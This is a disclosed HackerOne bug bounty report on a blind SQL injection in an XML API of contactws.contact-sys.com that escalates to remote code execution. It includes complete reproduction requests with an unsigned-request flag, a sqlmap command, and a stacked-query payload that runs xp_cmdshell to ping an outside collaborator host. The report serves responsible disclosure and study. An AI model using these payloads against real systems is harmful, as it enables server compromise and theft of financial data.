---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '816254'
original_report_id: '816254'
title: SQL injection on contactws.contact-sys.com in TScenObject action ScenObjects
  leads to remote code execution
weakness: Code Injection
team_handle: qiwi
created_at: '2020-03-10T19:57:50.225Z'
disclosed_at: '2020-06-19T06:03:15.587Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 473
asset_identifier: '*.contact-sys.com'
asset_type: WILDCARD
max_severity: critical
tags:
- hackerone
- code-injection
---

# SQL injection on contactws.contact-sys.com in TScenObject action ScenObjects leads to remote code execution

## Metadata

- HackerOne Report ID: 816254
- Weakness: Code Injection
- Program: qiwi
- Disclosed At: 2020-06-19T06:03:15.587Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

## Summary

The API interface on https://contactws.contact-sys.com:3456/ accepts a `<REQUEST/>` body to interact with the server's AppServ object. Because of insufficient input validation, an attacker can abuse the `SCEN_ID` parameter to inject arbitrary SQL statements into the `WHERE` clause of the underlying SQL statement. This leads to a blind SQL injection vulnerability, which in turn leads to Remote Code Execution on the server.

## Technical details

To find this vulnerability, I made use of a working `INT_SOFT_ID` that I found in online documentation, and the documentation for the `TScenObject` class on https://www.contact-sys.com/files/redactor/files/04_CONTACT%20Gateway_28.11.2017-2.pdf

It also leverages the fact that requests with the flag `ExpectSigned="No"` set do not require a valid signature.

The query appears to be something like:

```sql
SELECT *  FROM tblName WHERE id=<inject> order by STEP;
```

The RCE can be triggered by chaining multiple queries as one:
````sql
33; DECLARE @command varchar(255); SELECT @command='ping yhjbc2mndl88o89il3ueyud7zy5pte.burpcollaborator.net'; EXEC Master.dbo.xp_cmdshell @command; SELECT 1 as 'STEP'
``

## Steps to reproduce

To confirm the SQL injection, run `sqlmap -r sqlitest.txt --batch --current-db --force-ssl` with the following `input.txt`:

```http
POST / HTTP/1.1
Host: contactws.contact-sys.com:3456
Content-Type: application/xml
Content-Length: 185

<REQUEST OBJECT_CLASS="TScenObject" ACTION="ScenObjects" SCEN_ID="33*" ExpectSigned="No" INT_SOFT_ID="DA61D1CE-757F-44C3-B3F7-11A026C37CD4" POINT_CODE="tzhr" lang="en"></REQUEST>
```

{F743576}

To reproduce the RCE, execute the following request (replace with your own burp collaborator):

```http
POST / HTTP/1.1
Host: contactws.contact-sys.com:3456
Content-Type: application/xml
Content-Length: 342

<REQUEST OBJECT_CLASS="TScenObject" ACTION="ScenObjects" SCEN_ID="33; DECLARE @command varchar(255); SELECT @command='ping yhjbc2mndl88o89il3ueyud7zy5pte.burpcollaborator.net'; EXEC Master.dbo.xp_cmdshell @command; SELECT 1 as 'STEP'" ExpectSigned="No" INT_SOFT_ID="DA61D1CE-757F-44C3-B3F7-11A026C37CD4" POINT_CODE="tzhr" lang="en"></REQUEST>
```
and monitor your DNS logs for the incoming ping request:

{F743577}

## Recommendation

SQL injection vulnerabilities can be remedied by escaping the user-supplied input instead of using it to construct a query.

## Impact

By executing arbitrary commands on the server, an attacker could compromise the integrity, availability and confidentiality of customer's financially sensitive data on the CONTACT server and database, and pivot onto other servers on the internal network.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
